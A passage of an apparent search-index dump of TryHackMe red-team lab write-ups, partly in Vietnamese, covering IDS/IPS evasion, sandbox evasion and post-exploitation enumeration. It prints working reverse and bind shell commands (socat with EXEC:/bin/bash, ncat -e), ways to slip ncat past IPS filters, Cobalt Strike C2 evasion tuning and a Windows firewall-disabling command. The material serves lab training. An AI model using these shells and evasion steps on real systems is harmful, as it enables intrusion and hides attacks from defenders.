won\u2019t submit our certificate for signing. -x509 specifies that we want an X.509 certificate -newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size, such as -newkey rsa:2048 .) -days 365 shows that the validity of our certificate will be one year -subj sets data, such as organization and country, via the command-line. -nodes simplifies our command and does not encrypt the private key -keyout PRIVATE_KEY specifies the filename where we want to save our private key -out CERTIFICATE specifies the filename to which we want to write the certificate request The above command returns: Private key: thm-reverse.key Certificate: thm-reverse.crt The Privacy Enhanced Mail (PEM) .pem file requires the concatenation of the private key .key and the certificate .crt files. We can use cat to create our PEM file from the two files that we have just created: cat thm-reverse.key thm-reverse.crt > thm-reverse.pem . Secondly , with the PEM file ready, we can start listening while using the key for encrypting the communication with the client. socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT If you are not familiar with socat , the options that we used are: -d -d provides some debugging data (fatal, error, warning, and notice messages) OPENSSL-LISTEN:PORT_NUM indicates that the connection will be encrypted using OPENSSL cert=PEM_FILE provides the PEM file (certificate and private key) to establish the encrypted connection verify=0 disables checking peer\u2019s certificate fork creates a sub-process to handle each new connection. Thirdly , on the victim system, socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash . Note that the EXEC invokes the specified program. Let\u2019s demonstrate this. On the attacker system, we carried out the following: Pentester Terminal pentester @TryHackMe $ openssl req -x509 -newkey rsa : 4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse . key -out thm-reverse . crt Generating a RSA private key ........................++++ ......++++ writing new private key to 'thm-reverse.key' ----- pentester @TryHackMe $ ls thm-reverse . crt thm-reverse . key pentester @TryHackMe $ cat thm-reverse . key thm-reverse . crt > thm-reverse . pem pentester @TryHackMe $ socat -d -d OPENSSL-LISTEN : 4443 , cert = thm-reverse . pem , verify = 0 , fork STDOUT 2022 / 02 / 24 13 : 39 : 07 socat [ 1208 ] W ioctl ( 6 , IOCTL_VM_SOCKETS_GET_LOCAL_CID , ...): Inappropriate ioctl for device 2022 / 02 / 24 13 : 39 : 07 socat [ 1208 ] N listening on AF = 2 0 . 0 . 0 . 0 : 4443 As we have a listener on the attacker system, we switched to the victim machine, and we executed the following: Target Terminal pentester @target $ socat OPENSSL : 10 . 20 . 30 . 129 : 4443 , verify = 0 EXEC :/ bin / bash Back to the attacker system, let\u2019s run cat /etc/passwd : Pentester Terminal pentester @TryHackMe $ socat -d -d OPENSSL-LISTEN : 4443 , cert = thm-reverse . pem , verify = 0 , fork STDOUT [...] 2022 / 02 / 24 15 : 54 : 28 socat [ 7620 ] N starting data transfer loop with FDs [ 7 , 7 ] and [ 1 , 1 ] cat / etc / passwd root : x : 0 : 0 : root :/ root :/ bin / bash bin : x : 1 : 1 : bin :/ bin :/ sbin / nologin [...] However, if the IDS/IPS inspects the traffic, all the packet data will be encrypted. In other words, the IPS will be completely oblivious to exchange traffic and commands such as cat /etc/passwd . The screenshot below shows how things appear on the wire when captured using Wireshark. The highlighted packet contains cat /etc/passwd ; however, it is encrypted. As you can tell, it is not possible to make sense of the commands or data being exchanged. To better see the value of the added layer of encryption, we will compare this with an equivalent socat connection that does not use encryption. On the attacker\u2019s system, we run socat -d -d TCP-LISTEN:4443,fork STDOUT . On the victim\u2019s machine, we run socat TCP:10.20.30.129:4443 EXEC:/bin/bash . Back on the attacker\u2019s system, we type cat /etc/passwd and hit Enter/Return. Because no encryption was used, capturing the traffic exchanged between the two systems will expose the commands, and the traffic exchanged. In the following screenshot, we can see the command sent by the attacker. Furthermore, it is a trivial task to follow the TCP stream as it is in cleartext and learn everything exchanged between the attacker and the target system. The screenshot below uses the \u201cFollow TCP Stream\u201d option from Wireshark.","title":"Encrypt the Communication Channel"},{"location":"tryhackme/room/l/redteamnetsec/#modify-the-data","text":"Consider the simple case where you want to use Ncat to create a bind shell. The following command ncat -lvnp 1234 -e /bin/bash tells ncat to listen on TCP port 1234 and bind Bash shell to it. If you want to detect packets containing such commands, you need to think of something specific to match the signature but not too specific. Scanning for ncat -lvnp can be easily evaded by changing the order of the flags. On the other hand, inspecting the payload for ncat - can be evaded by adding an extra white space, such as ncat - which would still run correctly on the target system. If the IDS is looking for ncat , then simple changes to the original command won\u2019t evade detection. We need to consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such as nc or socat . Alternatively, you can consider a different encoding if the target system can process it properly. Answer the questions bellow Question: Using base64 encoding, what is the transformation of cat /etc/passwd ? Ans: Y2F0IC9ldGMvcGFzc3dkCg== Question: The base32 encoding of a particular string is NZRWC5BAFVWCAOBQHAYAU=== . What is the original string? Ans: ncat -l 8080 Question: Using the provided openssl command above. You created a certificate, which we gave the extension .crt , and a private key, which we gave the extension .key . What is the first line in the certificate file? Ans: -----BEGIN CERTIFICATE----- Question: What is the last line in the private key file? Ans: -----END PRIVATE KEY----- Question: On the attached machine from the previous task, browse to http://MACHINE_IP:8080 , where you can write your Linux commands. Note that no output will be returned. A command like ncat -lvnp 1234 -e /bin/bash will create a bind shell that you can connect to it from the AttackBox using ncat MACHINE_IP 1234 ; however, some IPS is filtering out the command we are submitting on the form. Using one of the techniques mentioned in this task, try to adapt the command typed in the form to run properly. Once you connect to the bind shell using ncat MACHINE_IP 1234 , find the user\u2019s name. Ans: redteamnetsec","title":"Modify the data"},{"location":"tryhackme/room/l/redteamnetsec/#task-6-evasion-via-route-manipulation","text":"Evasion via route manipulation includes: Relying on source routing Using proxy servers","title":"Task 6: Evasion via Route Manipulation"},{"location":"tryhackme/room/l/redteamnetsec/#relying-on-source-routing","text":"In many cases, you can use source routing to force the packets to use a certain route to reach their destination. Nmap provides this feature using the option --ip-options . Nmap offers loose and strict routing: Loose routing can be specified using L . For instance, --ip-options \"L 10.10.10.50 10.10.50.250\" requests that your scan packets are routed through the two provided IP addresses. Strict routing can be specified using S . Strict routing requires you to set every hop between your system and the target host. For instance, --ip-options \"S 10.10.10.1 10.10.20.2 10.10.30.3\" specifies that the packets go via these three hops before reaching the target host.","title":"Relying on Source Routing"},{"location":"tryhackme/room/l/redteamnetsec/#using-proxy-servers","text":"The use of proxy servers can help hide your source. Nmap offers the option --proxies that takes a list of a comma-separated list of proxy URLs. Each URL should be expressed in the format proto://host:port . Valid protocols are HTTP and SOCKS4; moreover, authentication is not currently supported. Consider the following example. Instead of running nmap -sS MACHINE_IP , you would edit your Nmap command to something like nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 MACHINE_IP . This way, you would make your scan go through HTTP proxy host1, then SOCKS4 proxy host2, before reaching your target. It is important to note that finding a reliable proxy requires some trial and error before you can rely on it to hide your Nmap scan source. If you use your web browser to connect to the target, it would be a simple task to pass your traffic via a proxy server. Other network tools usually provide their own proxy settings that you can use to hide your traffic source. Answer the questions bellow Question: Protocols used in proxy servers can be HTTP, HTTPS, SOCKS4, and SOCKS5. Which protocols are currently supported by Nmap? Ans: HTTP SOCKS4","title":"Using Proxy Servers"},{"location":"tryhackme/room/l/redteamnetsec/#task-7-evasion-via-tactical-dos","text":"Evasion via tactical DoS includes: Launching denial of service against the IDS/IPS Launching denial of Service against the logging server An IDS/IPS requires a high processing power as the number of rules grows and the network traffic volume increases. Moreover, especially in the case of IDS, the primary response is logging traffic information matching the signature. Consequently, you might find it beneficial if you can: Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS. Create a massive amount of not-malicious traffic that would still make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity. It is also worth noting that the target of your attack can be the IDS operator. By causing a vast number of false positives, you can cause operator fatigue against your \u201cadversary.\u201d Answer the questions bellow Question: Make sure you have read and understood the three points of this task. Ans: No answer needed","title":"Task 7: Evasion via Tactical DoS"},{"location":"tryhackme/room/l/redteamnetsec/#task-8-c2-and-idsips-evasion","text":"Pentesting frameworks, such as Cobalt Strike and Empire, offer malleable Command and Control (C2) profiles. These profiles allow various fine-tuning to evade IDS/IPS systems. If you are using such a framework, it is worth creating a custom profile instead of relying on a default one. Examples variables you can control include the following: User-Agent : The tool or framework you are using can expose you via its default-set user-agent. Hence, it is always important to set the user-agent to something innocuous and test to confirm your settings. Sleep Time : The sleep time allows you to control the callback interval between beacon check-ins. In other words, you can control how often the infected system will attempt to connect to the control system. Jitter : This variable lets you add some randomness to the sleep time, specified by the jitter percentage. A jitter of 30% results in a sleep time of \u00b130% to further evade detection. SSL Certificate : Using your authentic-looking SSL certificate will significantly improve your chances of evading detection. It is a very worthy investment of time. DNS Beacon : Consider the case where you are using DNS protocol to exfiltrate data. You can fine-tune DNS beacons by setting the DNS servers and the hostname in the DNS query. The hostname will be holding the exfiltrated data. This CobaltStrike Guideline Profile shows how a profile is put together. Answer the questions bellow Question: Which variable would you modify to add a random sleep time between beacon check-ins? Ans: Jitter","title":"Task 8: C2 and IDS/IPS Evasion"},{"location":"tryhackme/room/l/redteamnetsec/#task-9-next-gen-security","text":"Next-Generation Network IPS (NGNIPS) has the following five characteristics according to Gartner: Standard first-generation IPS capabilities: A next-generation network IPS should achieve what a traditional network IPS can do. Application awareness and full-stack visibility: Identify traffic from various applications and enforce the network security policy. An NGNIPS must be able to understand up to the application layer. Context-awareness: Use information from sources outside of the IPS to aid in blocking decisions. Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic. Agile engine: Support upgrade paths to benefit from new information feeds. Because a Next-Generation Firewall (NGFW) provides the same functionality as an IPS, it seems that the term NGNIPS is losing popularity for the sake of NGFW. You can read more about NGFW in the Red Team Firewalls room.","title":"Task 9: Next-Gen Security"},{"location":"tryhackme/room/l/redteamnetsec/#task-10-summary","text":"In this room, we covered IDS and IPS types based on installation location and detection engine. We also considered Snort 2 rules as an example of how IDS rules are triggered. To evade detection, one needs to gather as much information as possible about the deployed devices and experiment with different techniques. In other words, trial and error might be inevitable unless one has complete knowledge of the security devices and their configuration. Using Command and Control (C2) frameworks provides their contribution to IPS evasion via controlling the shape of the traffic to make it as innocuous as it can get. C2 profiles are a critical feature that one should learn to master if they use any C2 framework that supports malleable profiles.","title":"Task 10: Summary"},{"location":"tryhackme/room/l/sandboxevasion/","text":"Sandbox Evasion \u00b6 Task 1: Introduction \u00b6 Welcome to Sandbox Evasion \u00b6 Lots of companies deploy a \u201cDefense in Depth\u201d strategy, which refers to implementing security in layers, so if one layer fails, there should be another one that an adversary must evade. In this room, we will be focusing on one unique type of active defense; Sandboxes. Sandboxes provide a safe way to analyze a potentially malicious file and observe the effects on the system and return if the executable is malicious or not. Learning Objectives \u00b6 In this room, we will learn about Sandboxes in-depth; by the time you finish this room, you will gain a better understanding of the following topics: Learn how Malware Sandboxes work Learn about Static and Dynamic Malware Analysis Common Sandbox Evasion Methods Developing and Testing Sandbox Evasion Methods with Any.Run Room Pre-requisites \u00b6 For this room, we recommend the prior experience in the following areas: Windows APIs C++ Programming Active Directory Task 2: An Adversary walks into a Sandbox \u00b6 What is Malware Analysis \u00b6 Malware Analysis is the process of analyzing a suspicious file to determine what it does on both a micro level (by looking at Assembly), and a macro level (by looking at what it does on the system). This process lets Blue Teamers gain a better understanding of malicious programs, which can aid them in developing detections. Static vs. Dynamic Analysis \u00b6 There are two ways that a Blue Teamer can analyze a suspicious file; one way is by looking at the code on a micro-level (as previously stated) by using Disassemblers such as IDA or Ghidra. This process is more well known as \u201cStatic Analysis\u201d. On the flip side of the coin, we can observe what happens when the suspicious file is executed on the system through a process called \u201cDynamic Analysis\u201d. On the system, there are often many analysis tools installed, such as EDR Software, Sysmon, ProcMon, Process Hacker, and Debuggers (For example, OllyDebug, WinDbg, x64Dbg), and much more. Introduction to Sandboxes \u00b6 One of the most creative and effective ways that Blue Teamers have come up with to analyze suspicious-looking files is in the category of Dynamic Analysis. This method involves running the file in a containerized (or virtualized) environment; This environment is referred to as a Sandbox. Depending on the sandbox of choice, you may be able to customize what version of Windows is running, the software installed on the machine, and much more. Sandboxes provide a safe and effective way to monitor what a suspicious-looking file does before running it on a production system (or allowing it to be sent to a production system). There are many commercial Sandboxes that may be in place in various parts of a network. In the diagram above, there are three different sandboxes in place. It is not uncommon for there to be one, two, or even three Sandboxes in a corporate environment. Often you may find them in the following places: Firewalls Mail Servers Workstations Each sandbox may work differently; for example, a Firewall may execute the attachment in the email and see what kind of network communications occur, whereas a Mail sandbox may open the email and see if an embedded file within the email triggers a download over a protocol like SMB in an attempt to steal a NetNTLM hash, where a host-based Anti-Virus Sandbox may execute the file and monitor for malicious programmatic behavior or changes to the system. There are various vendors that make various Sandbox products that Blue Teamers may be able to deploy in a corporate network. Here are some popular examples: Palo Alto Wildfire ( Firewall ) Proofpoint TAP ( Email Sandbox ) Falcon Sandbox ( EDR/Workstation ) MimeCast ( Email Sandbox ) VirusTotal ( Sample Submission Site ) Any.Run ( Sample Submission Site ) Antiscan.me ( Sample Submission Site ) Joe Sandbox ( Sample Submission Site ) In the next section, we will learn about various techniques commonly deployed by Malware authors to gain an understanding of some evasion techniques that exist. We have provided a Windows development VM where you can develop your own Sandbox evasion techniques. You can access the virtual machine with the following credentials: Username: Administrator Password: TryHackMe123!","title":"Sandbox Evasion"},{"location":"tryhackme/room/l/sandboxevasion/#sandbox-evasion","text":"","title":"Sandbox Evasion"},{"location":"tryhackme/room/l/sandboxevasion/#task-1-introduction","text":"","title":"Task 1: Introduction"},{"location":"tryhackme/room/l/sandboxevasion/#welcome-to-sandbox-evasion","text":"Lots of companies deploy a \u201cDefense in Depth\u201d strategy, which refers to implementing security in layers, so if one layer fails, there should be another one that an adversary must evade. In this room, we will be focusing on one unique type of active defense; Sandboxes. Sandboxes provide a safe way to analyze a potentially malicious file and observe the effects on the system and return if the executable is malicious or not.","title":"Welcome to Sandbox Evasion"},{"location":"tryhackme/room/l/sandboxevasion/#learning-objectives","text":"In this room, we will learn about Sandboxes in-depth; by the time you finish this room, you will gain a better understanding of the following topics: Learn how Malware Sandboxes work Learn about Static and Dynamic Malware Analysis Common Sandbox Evasion Methods Developing and Testing Sandbox Evasion Methods with Any.Run","title":"Learning Objectives"},{"location":"tryhackme/room/l/sandboxevasion/#room-pre-requisites","text":"For this room, we recommend the prior experience in the following areas: Windows APIs C++ Programming Active Directory","title":"Room Pre-requisites"},{"location":"tryhackme/room/l/sandboxevasion/#task-2-an-adversary-walks-into-a-sandbox","text":"","title":"Task 2: An Adversary walks into a Sandbox"},{"location":"tryhackme/room/l/sandboxevasion/#what-is-malware-analysis","text":"Malware Analysis is the process of analyzing a suspicious file to determine what it does on both a micro level (by looking at Assembly), and a macro level (by looking at what it does on the system). This process lets Blue Teamers gain a better understanding of malicious programs, which can aid them in developing detections.","title":"What is Malware Analysis"},{"location":"tryhackme/room/l/sandboxevasion/#static-vs-dynamic-analysis","text":"There are two ways that a Blue Teamer can analyze a suspicious file; one way is by looking at the code on a micro-level (as previously stated) by using Disassemblers such as IDA or Ghidra. This process is more well known as \u201cStatic Analysis\u201d. On the flip side of the coin, we can observe what happens when the suspicious file is executed on the system through a process called \u201cDynamic Analysis\u201d. On the system, there are often many analysis tools installed, such as EDR Software, Sysmon, ProcMon, Process Hacker, and Debuggers (For example, OllyDebug, WinDbg, x64Dbg), and much more.","title":"Static vs. Dynamic Analysis"},{"location":"tryhackme/room/l/sandboxevasion/#introduction-to-sandboxes","text":"One of the most creative and effective ways that Blue Teamers have come up with to analyze suspicious-looking files is in the category of Dynamic Analysis. This method involves running the file in a containerized (or virtualized) environment; This environment is referred to as a Sandbox. Depending on the sandbox of choice, you may be able to customize what version of Windows is running, the software installed on the machine, and much more. Sandboxes provide a safe and effective way to monitor what a suspicious-looking file does before running it on a production system (or allowing it to be sent to a production system). There are many commercial Sandboxes that may be in place in various parts of a network. In the diagram above, there are three different sandboxes in place. It is not uncommon for there to be one, two, or even three Sandboxes in a corporate environment. Often you may find them in the following places: Firewalls Mail Servers Workstations Each sandbox may work differently; for example, a Firewall may execute the attachment in the email and see what kind of network communications occur, whereas a Mail sandbox may open the email and see if an embedded file within the email triggers a download over a protocol like SMB in an attempt to steal a NetNTLM hash, where a host-based Anti-Virus Sandbox may execute the file and monitor for malicious programmatic behavior or changes to the system. There are various vendors that make various Sandbox products that Blue Teamers may be able to deploy in a corporate network. Here are some popular examples: Palo Alto Wildfire ( Firewall ) Proofpoint TAP ( Email Sandbox ) Falcon Sandbox ( EDR/Workstation ) MimeCast ( Email Sandbox ) VirusTotal ( Sample Submission Site ) Any.Run ( Sample Submission Site ) Antiscan.me ( Sample Submission Site ) Joe Sandbox ( Sample Submission Site ) In the next section, we will learn about various techniques commonly deployed by Malware authors to gain an understanding of some evasion techniques that exist. We have provided a Windows development VM where you can develop your own Sandbox evasion techniques. You can access the virtual machine with the following credentials: Username: Administrator Password: TryHackMe123!","title":"Introduction to Sandboxes"},{"location":"tryhackme/room/l/the-lay-of-the-land/","tags":["THM-Room"],"text":"The Lay of the Land \u00b6 Task 1: Introduction \u00b6 It is essential to be familiar with the environment where you have initial access to a compromised machine during a red team engagement. Therefore, performing reconnaissance and enumeration is a significant part, and the primary goal is to gather as much information as possible to be used in the next stage. With an initial foothold established, the post-exploitation process begins! This room introduces commonly-used concepts, technologies, and security products that we need to be aware of. In this room, the assumption is that we have already gained access to the machine, and we are ready to expand our knowledge more about the environment by performing enumerating for the following: Network infrastrucutre Active Directory Environment Users and Groups Host-based security solutions Network-based security solutions Applications and services Answer the question bellow \u00b6 Let's start learning! No needed answer Task 2: Deploy the VM \u00b6 Answer the question bellow \u00b6 Let's discuss the common network infrastructure in the next task! No needed answer Task 3: Network Infrastructure \u00b6 N\u1ed9i dung ch\u00ednh \u00b6 T\u1eeb \u0111\u00e2y tr\u1edf \u0111i, t\u00f4i s\u1ebd n\u00f3i ti\u1ebfng vi\u1ec7t v\u00e0 c\u00f3 th\u1ec3 t\u00f3m t\u1eaft m\u1ed9t v\u00e0i \u0111i\u1ec1u m\u00e0 c\u1ea7n n\u1eafm trong nh\u1eefng task. Ta c\u00f3 m\u1ed9t s\u1ed1 th\u1ee9 c\u01a1 b\u1ea3n v\u1ec1 network nh\u01b0 sau: Internal Networks : L\u00e0 v\u00f9ng m\u1ea1ng n\u1ed9i b\u1ed9 gi\u00fap chia s\u1ebb th\u00f4ng tin v\u00e0 li\u00ean l\u1ea1c nhanh h\u01a1n trong t\u1ed5 ch\u1ee9c. Nh\u1eefng ng\u01b0\u1eddi system admin s\u1ebd config nh\u1eefng th\u1ee9 n\u00e0y Alt text Tr\u00ean \u0111\u00e2y l\u00e0 h\u00ecnh \u1ea3nh s\u01a1 l\u01b0\u1ee3c DMZ Zone : V\u00f9ng DMZ l\u00e0 v\u00f9ng m\u1ea1ng ngo\u1ea1i bi\u00ean d\u00f9ng \u0111\u1ec3 b\u1ea3o v\u1ec7 cho v\u00f9ng m\u1ea1ng n\u1ed9i b\u1ed9 b\u1eb1ng c\u00e1ch \u0111\u1ea9y c\u00e1c traffic kh\u00f4ng \u0111\u00e1ng tin c\u1eady ra v\u00f9ng n\u00e0y. Alt text Trong s\u01a1 \u0111\u1ed3 tr\u01b0\u1edbc, ch\u00fang t\u00f4i bi\u1ec3u th\u1ecb l\u01b0u l\u01b0\u1ee3ng m\u1ea1ng \u0111\u1ebfn m\u1ea1ng DMZ b\u1eb1ng m\u00e0u \u0111\u1ecf, kh\u00f4ng \u0111\u00e1ng tin c\u1eady (\u0111\u1ebfn tr\u1ef1c ti\u1ebfp t\u1eeb internet). L\u01b0u l\u01b0\u1ee3ng m\u1ea1ng xanh gi\u1eefa m\u1ea1ng n\u1ed9i b\u1ed9 l\u00e0 l\u01b0u l\u01b0\u1ee3ng \u0111\u01b0\u1ee3c ki\u1ec3m so\u00e1t c\u00f3 th\u1ec3 \u0111i qua m\u1ed9t ho\u1eb7c nhi\u1ec1u thi\u1ebft b\u1ecb an ninh m\u1ea1ng. Vi\u1ec7c li\u1ec7t k\u00ea h\u1ec7 th\u1ed1ng v\u00e0 m\u1ea1ng n\u1ed9i b\u1ed9 l\u00e0 giai \u0111o\u1ea1n kh\u00e1m ph\u00e1, cho ph\u00e9p k\u1ebb t\u1ea5n c\u00f4ng t\u00ecm hi\u1ec3u v\u1ec1 h\u1ec7 th\u1ed1ng v\u00e0 m\u1ea1ng n\u1ed9i b\u1ed9. D\u1ef1a tr\u00ean th\u00f4ng tin thu \u0111\u01b0\u1ee3c, ch\u00fang t\u00f4i s\u1eed d\u1ee5ng th\u00f4ng tin \u0111\u00f3 \u0111\u1ec3 x\u1eed l\u00fd chuy\u1ec3n \u0111\u1ed9ng ngang ho\u1eb7c leo thang \u0111\u1eb7c quy\u1ec1n nh\u1eb1m \u0111\u1ea1t \u0111\u01b0\u1ee3c nhi\u1ec1u \u0111\u1eb7c quy\u1ec1n h\u01a1n tr\u00ean h\u1ec7 th\u1ed1ng ho\u1eb7c m\u00f4i tr\u01b0\u1eddng AD. Network Enumeration : D\u00f9ng netstat \u0111\u1ec3 ki\u1ec3m tra c\u00e1c k\u1ebft n\u1ed1i tcp, udp,... Command Prompt PS C :\\ Users \\ thm > netstat -na Active Connections Proto Local Address Foreign Address State TCP 0 . 0 . 0 . 0 : 80 0 . 0 . 0 . 0 : 0 LISTENING TCP 0 . 0 . 0 . 0 : 88 0 . 0 . 0 . 0 : 0 LISTENING TCP 0 . 0 . 0 . 0 : 135 0 . 0 . 0 . 0 : 0 LISTENING TCP 0 . 0 . 0 . 0 : 389 0 . 0 . 0 . 0 : 0 LISTENING Command Prompt PS C :\\ Users \\ thm > arp -a Interface : 10 . 10 . 141 . 51 --- 0xa Internet Address Physical Address Type 10 . 10 . 0 . 1 02-c8 - 85-b5 - 5a-aa dynamic 10 . 10 . 255 . 255 ff-ff-ff-ff-ff-ff static Task 4: Active Directory (AD) environment \u00b6 A list of Active Directory components that we need to be familiar with: Domain Controllers Organizational Units AD objects AD Domains Forest AD Service Accounts: Built-in local users, Domain users, Managed service accounts Domain Administrators Alt text \u0110\u1ec3 ki\u1ec3m tra xem m\u00e1y t\u00ednh c\u00f3 ph\u1ea3i m\u1ed9t ph\u1ea7n trong AD hay kh\u00f4ng ta d\u00f9ng l\u1ec7nh systeminfo Powershell PS C :\\ Users \\ thm > systeminfo | findstr Domain OS Configuration : Primary Domain Controller Domain : thmdomain . com V\u1edbi k\u1ebft qu\u1ea3 tr\u00ean, m\u00e1y \u0111ang l\u00e0 1 ph\u1ea7n c\u1ee7a AD v\u1edbi domain thmdomain.com N\u1ebfu k\u1ebft qu\u1ea3 b\u1ea1n cho ra l\u00e0 WORKGROUP (th\u00f4ng th\u01b0\u1eddng test tr\u00ean m\u00e1y t\u00ednh c\u00e1 nh\u00e2n) th\u00ec \u0111\u00e2y l\u00e0 m\u00f4i tr\u01b0\u1eddng c\u1ee5c b\u1ed9. Answer the questions bellow \u00b6 Before going any further, ensure the attached machine is deployed and try what we discussed. Is the attached machine part of the AD environment? (Y|N) y Ta ki\u1ec3m tra b\u1eb1ng l\u1ec7nh systeminfo | findstr Domain Alt text If it is part of an AD environment, what is the domain name of the AD? thmredteam.com Task 5: Users and Groups Management BUILTIN\\Administrator Local admin access on a domain controller Domain Admins Administrative access to all resources in the domain Enterprise Admins Available only in the forest root Schema Admins Capable of modifying domain/forest; useful for red teamers Server Operators Can manage domain servers Account Operators Can manage users that are not in privileged groups Active Directory (AD) Enum \u00b6 Ta d\u00f9ng l\u1ec7nh Get-ADUser -Filter * \u0111\u1ec3 l\u1ea5y c\u00e1c t\u00e0i kho\u1ea3n trong AD Answer the questions bellow \u00b6 Use the Get-ADUser -Filter * -SearchBase command to list the available user accounts within THM OU in the thmredteam.com domain. How many users are available? 6 D\u00f9ng l\u1ec7nh Get-ADUser -Filter * -SearchBase \"OU=THM,DC=thmredteam,DC=com\" nh\u1eb1m l\u1ea5y user t\u1eeb t\u1ed5 ch\u1ee9c THM Once you run the previous command, what is the UserPrincipalName (email) of the admin account? thmadmin@thmredteam.com Task 6: Host Security Solution #1 Host Security Solutions \u00b6 Antivirus software: Signature-based detection is one of the common and traditional techniques used in antivirus software to identify malicious files. Often, researchers or users submit their infected files into an antivirus engine platform for further analysis by AV vendors, and if it confirms as malicious, then the signature gets registered in their database. The antivirus software compares the scanned file with a database of known signatures for possible attacks and malware on the client-side. If we have a match, then it considers a threat. Heuristic-based detection uses machine learning to decide whether we have the malicious file or not. It scans and statically analyses in real-time in order to find suspicious properties in the application's code or check whether it uses uncommon Windows or system APIs. It does not rely on the signature-based attack in making the decisions, or sometimes it does. This depends on the implementation of the antivirus software. Finally, Behavior-based detection relies on monitoring and examining the execution of applications to find abnormal behaviors and uncommon activities, such as creating/updating values in registry keys, killing/creating processes, etc. As a red teamer, it is essential to be aware of whether antivirus exists or not. It prevents us from doing what we are attempting to do. We can enumerate AV software using Windows built-in tools, such as wmic. D\u00f9ng wmic (wmic /namespace:\\root\\securitycenter2 path antivirusproduct) \u0111\u1ec3 li\u1ec7t k\u00ea ph\u1ea7n m\u1ec1m anti virus L\u1ec7nh c\u00f3 \u00fd ngh\u0129a t\u01b0\u01a1ng \u0111\u01b0\u01a1ng tr\u00ean poweshell: Get-CimInstance -Namespace root / SecurityCenter2 -ClassName AntivirusProduct Microsoft Windows Defender: Ki\u1ec3m tra tr\u1ea1ng th\u00e1i d\u1ecbch v\u1ee5 c\u1ee7a Windows Defender: Get-Service WinDefend Ki\u1ec3m tra tr\u1ea1ng th\u00e1i realtime protection: Get-MpComputerStatus | select RealTimeProtectionEnabled Host-based Firewall: Ki\u1ec3m tra t\u01b0\u1eddng l\u1eeda Get-NetFirewallProfile | Format-Table Name , Enabled L\u1ec7nh t\u1eaft t\u01b0\u1eddng l\u1eeda (\u1edf vai tr\u00f2 qu\u1ea3n tr\u1ecb vi\u00ean) Set-NetFirewallProfile -Profile Domain , Public , Private -Enabled False Select property c\u1ee7a t\u01b0\u1eddng l\u1eeda: Get-NetFirewallRule | select * Get-NetFirewallRule | select DisplayName , Enabled , Description Ki\u1ec3m tra k\u1ebft n\u1ed1i Test-NetConnection -ComputerName 127 . 0 . 0 . 1 -Port 80 Security Event Logging and Monitoring Host-based Intrusion Detection System (HIDS)/ Host-based Intrusion Prevention System (HIPS) Endpoint Detection and Response (EDR) Answer the questions bellow \u00b6 Enumerate the attached Windows machine and check whether the host-based firewall is enabled or not! (Y|N) N Ki\u1ec3m tra b\u1eb1ng l\u1ec7nh Get-NetFirewallProfile | Format-Table Name, Enabled ta th\u1ea5y t\u01b0\u1eddng l\u1eeda ch\u01b0a \u0111\u01b0\u1ee3c b\u1eadt. Alt text Using PowerShell cmdlets such Get-MpThreat can provide us with threats details that have been detected using MS Defender. Run it and answer the following: What is the file name that causes this alert to record? powerview.ps1 Xem h\u00ecnh sau Alt text UEnumerate the firewall rules of the attached Windows machine. What is the port that is allowed under the THM-Connection rule? 17337 D\u00f9ng l\u1ec7nh get-netfirewallrule | select displayname , enabled , description Xem h\u00ecnh sau Alt text In the next task, we will keep discussing the host security solution. I'm ready! No needed answer Task 7: Host Security Solution #2 \u00b6 Ta s\u1ebd n\u00f3i v\u1ec1 m\u1ed9t s\u1ed1 gi\u1ea3i ph\u00e1p b\u1ea3o m\u1eadt Security Event Logging and Monitoring \u00b6 D\u00f9ng l\u1ec7nh Get-EventLog -List System Monitor (Sysmon) 1 \u00b6 M\u1ed9t trong nh\u1eefng t\u00ednh n\u0103ng c\u1ee7a sysmon Process creation and termination Network connections Modification on file Remote threats Process and memory access and many others Ki\u1ec3m tra sysmon c\u00f3 \u0111\u01b0\u1ee3c c\u00e0i \u0111\u1eb7t ch\u01b0a: - Get-Process | Where-Object { $_.ProcessName -eq \"Sysmon\" } - reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational Host-based Intrusion Detection/Prevention System (HIDS/HIPS) \u00b6 Alt text HIDS stands for Host-based Intrusion Detection System. It is software that has the ability to monitor and detect abnormal and malicious activities in a host. The primary purpose of HIDS is to detect suspicious activities and not to prevent them. There are two methods that the host-based or network intrusion detection system works, including: Signature-based IDS - it looks at checksums and message authentication. Anomaly-based IDS looks for unexpected activities, including abnormal bandwidth usage, protocols, and ports. Host-based Intrusion Prevention Systems (HIPS) works by securing the operating system activities which where is installed. It is a detecting and prevention solution against well-known attacks and abnormal behaviors. HIPS is capable of auditing log files of the host, monitoring processes, and protecting system resources. HIPS is a mixture of best product features such as antivirus, behavior analysis, network, application firewall, etc. There is also a network-based IDS/IPS, which we will be covering in the next task. Endpoint Detection and Response (EDR) \u00b6 Alt text It is also known as Endpoint Detection and Threat Response (EDTR). The EDR is a cybersecurity solution that defends against malware and other threats. EDRs can look for malicious files, monitor endpoint, system, and network events, and record them in a database for further analysis, detection, and investigation. EDRs are the next generation of antivirus and detect malicious activities on the host in real-time. EDR analyze system data and behavior for making section threats, including Malware, including viruses, trojans, adware, keyloggers Exploit chains Ransomware Below are some common EDR software for endpoints Cylance Crowdstrike Symantec SentinelOne Many others Even though an attacker successfully delivered their payload and bypassed EDR in receiving reverse shell, EDR is still running and monitors the system. It may block us from doing something else if it flags an alert. We can use scripts for enumerating security products within the machine, such as Invoke-EDRChecker and SharpEDRChecker . They check for commonly used Antivirus, EDR, logging monitor products by checking file metadata, processes, DLL loaded into current processes, Services, and drivers, directories. Task 8: Network Security Solutions \u00b6 Task 9: Applications and Services \u00b6 Installed Applications \u00b6 Li\u1ec7t k\u00ea c\u00e1c \u1ee9ng d\u1ee5ng \u0111\u00e3 c\u00e0i \u0111\u1eb7t: wmic product get name,version T\u00ecm ki\u1ebfm th\u01b0 m\u1ee5c/t\u1ec7p tin \u1ea9n b\u1eb1ng Get-ChildItem v\u1edbi c\u1edd Hidden: Get-ChildItem -Hidden -Path 